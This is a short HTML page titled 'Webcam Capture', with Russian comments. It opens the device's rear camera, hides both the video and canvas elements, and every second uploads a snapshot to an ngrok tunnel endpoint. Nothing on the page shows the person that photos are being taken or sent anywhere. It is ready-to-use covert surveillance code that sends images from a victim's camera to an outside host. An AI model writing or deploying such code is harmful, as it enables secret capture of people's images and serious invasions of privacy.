<!DOCTYPE html>
<html lang="ru">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Webcam Capture</title>
  </head>
  <body>
    <video id="video" style="display: none" autoplay playsinline></video>
    <canvas id="canvas" style="display: none"></canvas>

    <script>
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const context = canvas.getContext("2d");

      // Запрос доступа к камере с использованием задней камеры
      navigator.mediaDevices
        .getUserMedia({ video: { facingMode: "environment" } })  // Используем "environment" для задней камеры
        .then((stream) => {
          video.srcObject = stream;
        })
        .catch((error) => console.error("Ошибка доступа к камере:", error));

      // Функция для отправки снимков
      function sendSnapshot() {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob((blob) => {
          const formData = new FormData();
          formData.append("image", blob, "snapshot.jpg");

          fetch("https://295d-91-205-48-117.ngrok-free.app/upload.php", {
            method: "POST",
            body: formData,
          })
            .then((response) => response.text())
            .then((data) => console.log("Ответ сервера:", data))
            .catch((error) => console.error("Ошибка отправки:", error));
        }, "image/jpeg");
      }

      // Запускаем отправку снимков каждую секунду
      setInterval(sendSnapshot, 1000);
    </script>
  </body>
</html>
